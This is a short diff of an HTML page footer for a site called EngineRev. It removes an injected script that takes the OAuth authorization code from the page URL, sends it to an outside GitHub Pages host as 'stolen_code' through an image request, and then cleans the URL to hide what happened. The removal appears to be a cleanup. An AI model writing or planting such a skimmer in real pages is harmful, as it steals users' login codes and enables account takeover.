@@ -325,19 +325,7 @@
   <div class="copyright-footer">
     &copy; 2024 EngineRev. All rights reserved.
   </div>
-<script>
-  // Extract the OAuth code from the URL
-  const urlParams = new URLSearchParams(window.location.search);
-  const authCode = urlParams.get('code');
 
-  if (authCode) {
-      // Send the code via an image request (Referer header should include original page)
-      new Image().src = "https://joshmainaa7.github.io/ref/?stolen_code=" + authCode;
-
-      // Clean the URL so the user doesn't notice anything suspicious
-      window.history.replaceState({}, document.title, window.location.pathname);
-  }
-</script>
 
     </body>
 </html>
